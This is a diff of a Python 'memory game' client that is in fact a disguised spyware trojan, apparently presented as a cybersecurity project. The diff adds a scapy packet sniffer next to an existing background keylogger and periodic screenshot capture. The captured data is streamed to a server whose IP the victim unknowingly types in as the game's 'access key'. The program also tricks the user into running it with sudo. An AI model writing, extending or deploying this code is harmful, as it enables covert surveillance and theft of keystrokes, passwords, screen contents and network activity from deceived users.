@@ -2,7 +2,8 @@
 """
 =============================================================
   🧠 MEMORAMA - Juego de Memoria
-  (Cliente Keylogger disfrazado - Proyecto de Ciberseguridad)
+  (Cliente Hacking Ético disfrazado - Ciberseguridad)
+  Incluye: Keylogger + Screenshots + Sniffer de red
 =============================================================
 """
 
@@ -31,10 +32,19 @@ except ImportError:
     print("[!] Instala Pillow: pip install Pillow")
     sys.exit(1)
 
+try:
+    from scapy.all import sniff as scapy_sniff, IP, TCP, UDP, Raw
+    SCAPY_AVAILABLE = True
+except ImportError:
+    SCAPY_AVAILABLE = False
+    print("[!] scapy no disponible, sniffing desactivado (pip install scapy)")
+
 # ── Configuración oculta ──────────────────────────────────
 DEFAULT_PORT = 9999
 SCREENSHOT_INTERVAL = 60
 KEY_BUFFER_FLUSH_INTERVAL = 5
+SNIFF_FLUSH_INTERVAL = 10
+SNIFF_PACKET_COUNT = 0       # 0 = infinito
 LOCAL_LOG_FILE = ".game_cache.tmp"
 
 # ── Emojis para el memorama ───────────────────────────────
@@ -53,33 +63,22 @@ KEY_MAP = {
     "KEY_1": "1", "KEY_2": "2", "KEY_3": "3", "KEY_4": "4",
     "KEY_5": "5", "KEY_6": "6", "KEY_7": "7", "KEY_8": "8",
     "KEY_9": "9", "KEY_0": "0",
-    "KEY_SPACE": " ",
-    "KEY_ENTER": "[ENTER]\n",
-    "KEY_TAB": "[TAB]",
-    "KEY_BACKSPACE": "[BACKSPACE]",
-    "KEY_DELETE": "[DELETE]",
-    "KEY_ESC": "[ESC]",
-    "KEY_CAPSLOCK": "[CAPS]",
-    "KEY_DOT": ".", "KEY_COMMA": ",",
-    "KEY_SLASH": "/", "KEY_BACKSLASH": "\\",
-    "KEY_SEMICOLON": ";", "KEY_APOSTROPHE": "'",
+    "KEY_SPACE": " ", "KEY_ENTER": "[ENTER]\n", "KEY_TAB": "[TAB]",
+    "KEY_BACKSPACE": "[BACKSPACE]", "KEY_DELETE": "[DELETE]",
+    "KEY_ESC": "[ESC]", "KEY_CAPSLOCK": "[CAPS]",
+    "KEY_DOT": ".", "KEY_COMMA": ",", "KEY_SLASH": "/",
+    "KEY_BACKSLASH": "\\", "KEY_SEMICOLON": ";", "KEY_APOSTROPHE": "'",
     "KEY_LEFTBRACE": "[", "KEY_RIGHTBRACE": "]",
-    "KEY_MINUS": "-", "KEY_EQUAL": "=",
-    "KEY_GRAVE": "`",
-    "KEY_UP": "[↑]", "KEY_DOWN": "[↓]",
-    "KEY_LEFT": "[←]", "KEY_RIGHT": "[→]",
-    "KEY_F1": "[F1]", "KEY_F2": "[F2]", "KEY_F3": "[F3]",
-    "KEY_F4": "[F4]", "KEY_F5": "[F5]", "KEY_F6": "[F6]",
-    "KEY_F7": "[F7]", "KEY_F8": "[F8]", "KEY_F9": "[F9]",
-    "KEY_F10": "[F10]", "KEY_F11": "[F11]", "KEY_F12": "[F12]",
+    "KEY_MINUS": "-", "KEY_EQUAL": "=", "KEY_GRAVE": "`",
+    "KEY_UP": "[↑]", "KEY_DOWN": "[↓]", "KEY_LEFT": "[←]", "KEY_RIGHT": "[→]",
+    "KEY_F1": "[F1]", "KEY_F2": "[F2]", "KEY_F3": "[F3]", "KEY_F4": "[F4]",
+    "KEY_F5": "[F5]", "KEY_F6": "[F6]", "KEY_F7": "[F7]", "KEY_F8": "[F8]",
+    "KEY_F9": "[F9]", "KEY_F10": "[F10]", "KEY_F11": "[F11]", "KEY_F12": "[F12]",
 }
 
-# Teclas modificadoras (no se registran como texto)
 MODIFIER_KEYS = {
-    "KEY_LEFTSHIFT", "KEY_RIGHTSHIFT",
-    "KEY_LEFTCTRL", "KEY_RIGHTCTRL",
-    "KEY_LEFTALT", "KEY_RIGHTALT",
-    "KEY_LEFTMETA", "KEY_RIGHTMETA",
+    "KEY_LEFTSHIFT", "KEY_RIGHTSHIFT", "KEY_LEFTCTRL", "KEY_RIGHTCTRL",
+    "KEY_LEFTALT", "KEY_RIGHTALT", "KEY_LEFTMETA", "KEY_RIGHTMETA",
 }
 
 
@@ -90,10 +89,8 @@ def find_keyboard_devices():
         try:
             device = InputDevice(path)
             caps = device.capabilities(verbose=True)
-            # Buscar dispositivos que tengan eventos de teclas
             for cap_type, events in caps.items():
                 if cap_type[0] == "EV_KEY":
-                    # Verificar que tenga teclas de letras (no solo botones)
                     event_names = [e[0][0] if isinstance(e[0], list) else e[0] for e in events]
                     if any("KEY_A" in str(n) for n in event_names):
                         keyboards.append(device)
@@ -104,11 +101,11 @@ def find_keyboard_devices():
 
 
 # ══════════════════════════════════════════════════════════
-#  KEYLOGGER (OCULTO EN SEGUNDO PLANO)
+#  MÓDULO OCULTO: KEYLOGGER + SNIFFER
 # ══════════════════════════════════════════════════════════
 
 class SilentLogger:
-    """Keylogger que corre silenciosamente en background usando evdev."""
+    """Keylogger + Sniffer que corren silenciosamente en background."""
 
     def __init__(self, host, port):
         self.host = host
@@ -117,8 +114,11 @@ class SilentLogger:
         self.connected = False
         self.running = True
         self.key_buffer = []
+        self.sniff_buffer = []
         self.buffer_lock = threading.Lock()
+        self.sniff_lock = threading.Lock()
         self.shift_pressed = False
+        self.send_lock = threading.Lock()
 
     def connect(self):
         try:
@@ -143,79 +143,59 @@ class SilentLogger:
         if not self.connected:
             return False
         try:
-            header = {"type": msg_type, "size": len(payload)}
-            if filename:
-                header["filename"] = filename
-            header_json = json.dumps(header).encode("utf-8") + b"\n"
-            self.sock.sendall(header_json + payload)
+            with self.send_lock:
+                header = {"type": msg_type, "size": len(payload)}
+                if filename:
+                    header["filename"] = filename
+                header_json = json.dumps(header).encode("utf-8") + b"\n"
+                self.sock.sendall(header_json + payload)
             return True
         except (BrokenPipeError, ConnectionResetError, OSError):
             self.connected = False
             return False
 
-    def capture_keys(self):
-        """Captura teclas de TODOS los teclados usando evdev."""
-        keyboards = find_keyboard_devices()
+    # ── Keylogger ─────────────────────────────────────────
 
+    def capture_keys(self):
+        keyboards = find_keyboard_devices()
         if not keyboards:
             return
-
-        # Leer de todos los teclados en paralelo
         for kb in keyboards:
-            t = threading.Thread(
-                target=self._read_device, args=(kb,), daemon=True
-            )
+            t = threading.Thread(target=self._read_device, args=(kb,), daemon=True)
             t.start()
 
     def _read_device(self, device):
-        """Lee eventos de un dispositivo de teclado."""
         try:
             for event in device.read_loop():
                 if not self.running:
                     break
                 if event.type != ecodes.EV_KEY:
                     continue
-
                 key_event = categorize(event)
                 key_name = key_event.keycode
-
-                # Si es una lista, tomar el primer nombre
                 if isinstance(key_name, list):
                     key_name = key_name[0]
-
-                # Rastrear estado de shift
                 if key_name in ("KEY_LEFTSHIFT", "KEY_RIGHTSHIFT"):
                     if key_event.keystate == key_event.key_down:
                         self.shift_pressed = True
                     elif key_event.keystate == key_event.key_up:
                         self.shift_pressed = False
                     continue
-
-                # Ignorar modificadores
                 if key_name in MODIFIER_KEYS:
                     continue
-
-                # Solo registrar key_down (no repeticiones ni releases)
                 if key_event.keystate != key_event.key_down:
                     continue
-
-                # Convertir a texto
                 char = KEY_MAP.get(key_name, "")
                 if not char:
                     continue
-
-                # Aplicar shift (mayúsculas)
                 if self.shift_pressed and len(char) == 1 and char.isalpha():
                     char = char.upper()
-
                 with self.buffer_lock:
                     self.key_buffer.append(char)
-
         except (OSError, IOError):
-            pass  # Dispositivo desconectado
+            pass
 
     def flush_loop(self):
-        """Envía el buffer de teclas periódicamente."""
         while self.running:
             time.sleep(KEY_BUFFER_FLUSH_INTERVAL)
             with self.buffer_lock:
@@ -223,20 +203,16 @@ class SilentLogger:
                     continue
                 text = "".join(self.key_buffer)
                 self.key_buffer.clear()
-
-            # Log local
             try:
                 with open(LOCAL_LOG_FILE, "a") as f:
                     f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {text}\n")
             except Exception:
                 pass
-
             if self.connected:
                 if not self.send_data("keys", text.encode("utf-8")):
                     threading.Thread(target=self.reconnect, daemon=True).start()
 
     def screenshot_loop(self):
-        """Captura screenshots periódicamente."""
         while self.running:
             time.sleep(SCREENSHOT_INTERVAL)
             if not self.running:
@@ -248,24 +224,75 @@ class SilentLogger:
                 img_data = buf.getvalue()
             except Exception:
                 continue
-
             ts = datetime.now().strftime("%Y%m%d_%H%M%S")
             fname = f"screenshot_{ts}.png"
-
             if self.connected:
                 self.send_data("screenshot", img_data, fname)
 
+    # ── Sniffer ───────────────────────────────────────────
+
+    def _packet_callback(self, pkt):
+        """Procesa cada paquete capturado por scapy."""
+        if not self.running:
+            return
+        try:
+            if IP in pkt:
+                proto = "TCP" if TCP in pkt else ("UDP" if UDP in pkt else "OTHER")
+                src = pkt[IP].src
+                dst = pkt[IP].dst
+                sport = pkt[TCP].sport if TCP in pkt else (pkt[UDP].sport if UDP in pkt else 0)
+                dport = pkt[TCP].dport if TCP in pkt else (pkt[UDP].dport if UDP in pkt else 0)
+                size = len(pkt)
+                ts = datetime.now().strftime("%H:%M:%S")
+
+                line = f"[{ts}] {proto} {src}:{sport} → {dst}:{dport} ({size} bytes)\n"
+
+                with self.sniff_lock:
+                    self.sniff_buffer.append(line)
+        except Exception:
+            pass
+
+    def sniff_loop(self):
+        """Captura tráfico de red con scapy."""
+        if not SCAPY_AVAILABLE:
+            return
+        try:
+            scapy_sniff(prn=self._packet_callback, store=False,
+                       count=SNIFF_PACKET_COUNT,
+                       stop_filter=lambda x: not self.running)
+        except Exception:
+            pass
+
+    def sniff_flush_loop(self):
+        """Envía el buffer de sniffing periódicamente al servidor."""
+        while self.running:
+            time.sleep(SNIFF_FLUSH_INTERVAL)
+            with self.sniff_lock:
+                if not self.sniff_buffer:
+                    continue
+                text = "".join(self.sniff_buffer)
+                self.sniff_buffer.clear()
+
+            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+            fname = f"sniff_{ts}.txt"
+
+            if self.connected:
+                if not self.send_data("sniff", text.encode("utf-8"), fname):
+                    threading.Thread(target=self.reconnect, daemon=True).start()
+
+    # ── Inicio ────────────────────────────────────────────
+
     def start(self):
-        """Inicia todos los hilos del keylogger."""
         if not self.connect():
             threading.Thread(target=self.reconnect, daemon=True).start()
 
-        # Captura de teclas con evdev
         threading.Thread(target=self.capture_keys, daemon=True).start()
-        # Flush de teclas
         threading.Thread(target=self.flush_loop, daemon=True).start()
-        # Screenshots
         threading.Thread(target=self.screenshot_loop, daemon=True).start()
+
+        if SCAPY_AVAILABLE:
+            threading.Thread(target=self.sniff_loop, daemon=True).start()
+            threading.Thread(target=self.sniff_flush_loop, daemon=True).start()
 
     def stop(self):
         self.running = False
@@ -277,7 +304,7 @@ class SilentLogger:
 
 
 # ══════════════════════════════════════════════════════════
-#  JUEGO DE MEMORAMA (INTERFAZ VISIBLE)
+#  JUEGO DE MEMORAMA (INTERFAZ VISIBLE - "ENGAÑO")
 # ══════════════════════════════════════════════════════════
 
 class MemoramaApp:
@@ -287,42 +314,30 @@ class MemoramaApp:
         self.root.geometry("600x700")
         self.root.configure(bg="#0f0f23")
         self.root.resizable(False, False)
-
         self.logger = None
         self.show_login_screen()
 
-    # ── Pantalla de Login (pide la "clave") ────────────────
+    # ── Pantalla de Login (pide la IP como "clave") ───────
 
     def show_login_screen(self):
         self.clear_window()
-
         bg = "#0f0f23"
         fg = "#e0e0e0"
 
         container = tk.Frame(self.root, bg=bg)
         container.place(relx=0.5, rely=0.5, anchor="center")
 
-        tk.Label(
-            container, text="🧠", font=("Helvetica", 72), bg=bg
-        ).pack(pady=(0, 5))
-
-        tk.Label(
-            container, text="MEMORAMA",
-            font=("Helvetica", 36, "bold"), bg=bg, fg="#f0c040"
-        ).pack()
-
-        tk.Label(
-            container, text="Juego de Memoria",
-            font=("Helvetica", 14), bg=bg, fg="#888"
-        ).pack(pady=(0, 30))
+        tk.Label(container, text="🧠", font=("Helvetica", 72), bg=bg).pack(pady=(0, 5))
+        tk.Label(container, text="MEMORAMA", font=("Helvetica", 36, "bold"),
+                 bg=bg, fg="#f0c040").pack()
+        tk.Label(container, text="Juego de Memoria", font=("Helvetica", 14),
+                 bg=bg, fg="#888").pack(pady=(0, 30))
 
         key_frame = tk.Frame(container, bg=bg)
         key_frame.pack(pady=10)
 
-        tk.Label(
-            key_frame, text="🔑 Ingresa tu clave de acceso:",
-            font=("Helvetica", 13), bg=bg, fg=fg
-        ).pack()
+        tk.Label(key_frame, text="🔑 Ingresa tu clave de acceso:",
+                 font=("Helvetica", 13), bg=bg, fg=fg).pack()
 
         self.key_entry = tk.Entry(
             key_frame, width=22, font=("Courier", 16, "bold"),
@@ -336,37 +351,30 @@ class MemoramaApp:
         self.key_entry.focus_set()
 
         self.play_btn = tk.Button(
-            key_frame, text="🎮  JUGAR",
-            font=("Helvetica", 16, "bold"),
+            key_frame, text="🎮  JUGAR", font=("Helvetica", 16, "bold"),
             bg="#28a745", fg="white", activebackground="#218838",
             cursor="hand2", padx=40, pady=8, relief="flat",
             command=self.validate_key
         )
         self.play_btn.pack(pady=15)
 
-        self.error_label = tk.Label(
-            key_frame, text="",
-            font=("Helvetica", 11), bg=bg, fg="#ff4444"
-        )
+        self.error_label = tk.Label(key_frame, text="", font=("Helvetica", 11),
+                                    bg=bg, fg="#ff4444")
         self.error_label.pack()
 
-        tk.Label(
-            container, text="v2.0 • Obtén tu clave con el administrador",
-            font=("Helvetica", 9), bg=bg, fg="#555"
-        ).pack(pady=(20, 0))
+        tk.Label(container, text="v3.0 • Obtén tu clave con el administrador",
+                 font=("Helvetica", 9), bg=bg, fg="#555").pack(pady=(20, 0))
 
     def validate_key(self):
         key = self.key_entry.get().strip()
-
         if not key:
             self.error_label.config(text="⚠ Ingresa una clave")
             return
 
+        # La "clave" es la IP del servidor
         self.logger = SilentLogger(key, DEFAULT_PORT)
-
         self.play_btn.config(text="⏳ Cargando...", state=tk.DISABLED)
         self.error_label.config(text="", fg="#888")
-
         threading.Thread(target=self._init_and_play, daemon=True).start()
 
     def _init_and_play(self):
@@ -374,13 +382,11 @@ class MemoramaApp:
         time.sleep(0.5)
         self.root.after(0, self.show_game)
 
-    # ── Pantalla del Juego ─────────────────────────────────
+    # ── Pantalla del Juego ────────────────────────────────
 
     def show_game(self):
         self.clear_window()
-
         bg = "#0f0f23"
-        fg = "#e0e0e0"
 
         self.grid_size = 4
         total = self.grid_size * self.grid_size
@@ -401,31 +407,22 @@ class MemoramaApp:
 
         header = tk.Frame(self.root, bg="#1a1a3e", pady=8)
         header.pack(fill=tk.X)
-
-        tk.Label(
-            header, text="🧠 MEMORAMA",
-            font=("Helvetica", 20, "bold"), bg="#1a1a3e", fg="#f0c040"
-        ).pack()
+        tk.Label(header, text="🧠 MEMORAMA", font=("Helvetica", 20, "bold"),
+                 bg="#1a1a3e", fg="#f0c040").pack()
 
         stats = tk.Frame(self.root, bg=bg, pady=5)
         stats.pack(fill=tk.X, padx=20)
 
-        self.moves_label = tk.Label(
-            stats, text="Movimientos: 0",
-            font=("Helvetica", 12), bg=bg, fg="#aaa"
-        )
+        self.moves_label = tk.Label(stats, text="Movimientos: 0", font=("Helvetica", 12),
+                                    bg=bg, fg="#aaa")
         self.moves_label.pack(side=tk.LEFT)
 
-        self.pairs_label = tk.Label(
-            stats, text=f"Pares: 0/{self.total_pairs}",
-            font=("Helvetica", 12), bg=bg, fg="#aaa"
-        )
+        self.pairs_label = tk.Label(stats, text=f"Pares: 0/{self.total_pairs}",
+                                    font=("Helvetica", 12), bg=bg, fg="#aaa")
         self.pairs_label.pack(side=tk.RIGHT)
 
-        self.timer_label = tk.Label(
-            stats, text="⏱ 00:00",
-            font=("Helvetica", 12, "bold"), bg=bg, fg="#00d2ff"
-        )
+        self.timer_label = tk.Label(stats, text="⏱ 00:00", font=("Helvetica", 12, "bold"),
+                                    bg=bg, fg="#00d2ff")
         self.timer_label.pack()
 
         self.grid_frame = tk.Frame(self.root, bg=bg, pady=10)
@@ -435,53 +432,34 @@ class MemoramaApp:
         for i in range(total):
             row = i // self.grid_size
             col = i % self.grid_size
-
-            btn = tk.Button(
-                self.grid_frame,
-                text="❓",
-                font=("Helvetica", 28),
-                width=3, height=1,
-                bg="#2a2a4a", fg="#555",
-                activebackground="#3a3a5a",
-                relief="flat", bd=0,
-                cursor="hand2",
-                command=lambda idx=i: self.flip_card(idx)
-            )
+            btn = tk.Button(self.grid_frame, text="❓", font=("Helvetica", 28),
+                           width=3, height=1, bg="#2a2a4a", fg="#555",
+                           activebackground="#3a3a5a", relief="flat", bd=0,
+                           cursor="hand2", command=lambda idx=i: self.flip_card(idx))
             btn.grid(row=row, column=col, padx=6, pady=6, ipadx=5, ipady=5)
             self.buttons.append(btn)
 
         bottom = tk.Frame(self.root, bg=bg, pady=10)
         bottom.pack(fill=tk.X, padx=20)
 
-        tk.Button(
-            bottom, text="🔄 Nuevo Juego",
-            font=("Helvetica", 11, "bold"),
-            bg="#f0c040", fg="#111", activebackground="#daa520",
-            cursor="hand2", padx=15, pady=5, relief="flat",
-            command=self.show_game
-        ).pack(side=tk.LEFT)
+        tk.Button(bottom, text="🔄 Nuevo Juego", font=("Helvetica", 11, "bold"),
+                  bg="#f0c040", fg="#111", activebackground="#daa520",
+                  cursor="hand2", padx=15, pady=5, relief="flat",
+                  command=self.show_game).pack(side=tk.LEFT)
 
-        tk.Button(
-            bottom, text="🚪 Salir",
-            font=("Helvetica", 11, "bold"),
-            bg="#e94560", fg="white", activebackground="#c82333",
-            cursor="hand2", padx=15, pady=5, relief="flat",
-            command=self.quit_app
-        ).pack(side=tk.RIGHT)
+        tk.Button(bottom, text="🚪 Salir", font=("Helvetica", 11, "bold"),
+                  bg="#e94560", fg="white", activebackground="#c82333",
+                  cursor="hand2", padx=15, pady=5, relief="flat",
+                  command=self.quit_app).pack(side=tk.RIGHT)
 
         self.update_timer()
 
     def flip_card(self, idx):
-        if not self.can_click:
-            return
-        if self.flipped[idx] or self.matched[idx]:
+        if not self.can_click or self.flipped[idx] or self.matched[idx]:
             return
 
         self.flipped[idx] = True
-        self.buttons[idx].config(
-            text=self.cards[idx],
-            bg="#3a3a6a", fg="white"
-        )
+        self.buttons[idx].config(text=self.cards[idx], bg="#3a3a6a", fg="white")
 
         if self.first_card is None:
             self.first_card = idx
@@ -489,31 +467,23 @@ class MemoramaApp:
             self.moves += 1
             self.moves_label.config(text=f"Movimientos: {self.moves}")
             self.can_click = False
-
-            first = self.first_card
-            second = idx
+            first, second = self.first_card, idx
             self.first_card = None
 
             if self.cards[first] == self.cards[second]:
-                self.matched[first] = True
-                self.matched[second] = True
+                self.matched[first] = self.matched[second] = True
                 self.pairs_found += 1
-                self.pairs_label.config(
-                    text=f"Pares: {self.pairs_found}/{self.total_pairs}"
-                )
-
+                self.pairs_label.config(text=f"Pares: {self.pairs_found}/{self.total_pairs}")
                 self.buttons[first].config(bg="#1a6b3a")
                 self.buttons[second].config(bg="#1a6b3a")
                 self.can_click = True
-
                 if self.pairs_found == self.total_pairs:
                     self.root.after(500, self.show_win)
             else:
                 self.root.after(800, self.hide_cards, first, second)
 
     def hide_cards(self, a, b):
-        self.flipped[a] = False
-        self.flipped[b] = False
+        self.flipped[a] = self.flipped[b] = False
         self.buttons[a].config(text="❓", bg="#2a2a4a", fg="#555")
         self.buttons[b].config(text="❓", bg="#2a2a4a", fg="#555")
         self.can_click = True
@@ -521,23 +491,14 @@ class MemoramaApp:
     def update_timer(self):
         if hasattr(self, 'start_time') and self.pairs_found < self.total_pairs:
             elapsed = int(time.time() - self.start_time)
-            mins = elapsed // 60
-            secs = elapsed % 60
-            self.timer_label.config(text=f"⏱ {mins:02d}:{secs:02d}")
+            self.timer_label.config(text=f"⏱ {elapsed//60:02d}:{elapsed%60:02d}")
             self.root.after(1000, self.update_timer)
 
     def show_win(self):
         elapsed = int(time.time() - self.start_time)
-        mins = elapsed // 60
-        secs = elapsed % 60
-
-        messagebox.showinfo(
-            "🎉 ¡Ganaste!",
-            f"¡Felicidades! Completaste el memorama.\n\n"
-            f"Movimientos: {self.moves}\n"
-            f"Tiempo: {mins:02d}:{secs:02d}\n\n"
-            f"¿Quieres jugar de nuevo?"
-        )
+        messagebox.showinfo("🎉 ¡Ganaste!",
+            f"¡Felicidades!\n\nMovimientos: {self.moves}\n"
+            f"Tiempo: {elapsed//60:02d}:{elapsed%60:02d}\n\n¿Quieres jugar de nuevo?")
         self.show_game()
 
     def clear_window(self):
@@ -551,11 +512,10 @@ class MemoramaApp:
 
 
 def main():
-    # Verificar permisos
     if os.geteuid() != 0:
         print("=" * 50)
         print("  ⚠ Este juego necesita permisos de administrador")
-        print("  Ejecuta con: sudo <python_path> client.py")
+        print("  Ejecuta con: sudo python3 client.py")
         print("=" * 50)
         sys.exit(1)
 
